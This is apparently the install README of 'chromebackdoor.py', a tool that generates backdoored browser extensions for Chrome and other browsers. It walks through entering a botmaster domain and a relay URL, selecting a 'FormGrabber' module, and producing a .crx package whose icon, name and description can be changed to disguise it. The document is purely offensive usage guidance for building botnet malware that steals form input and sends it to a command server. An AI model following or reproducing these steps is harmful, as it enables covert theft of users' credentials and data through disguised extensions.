#INSTALL

install all dependency & start chromebackdoor.py

```sh
python chromebackdoor.py
```

You can generate backdoor for all most popular browser

exemple for Google Chrome:

```sh
python chromebackdoor.py --chrome
```

Now enter a botmaster domain name (need SSL):

```bash
[?] Website hosted (https://localhost/)? https://lynxframework.com/
```
Same for relais (need SSL):
```sh
[?] Website relais url (https://localhost/relais)? https://lynxrelay.com/relais
or use same domain
[?] Website relais url (https://localhost/relais)? https://lynxframework.com/relais
```
```sh
[?] Information correct [Y/n]? Y
```

Select one module (exemple FormGrabber V1.0)
```sh
[?] please select numbers ? 2
```

The script  generate zip file with .crx .perm and backdoor folder for update icon / name / desc
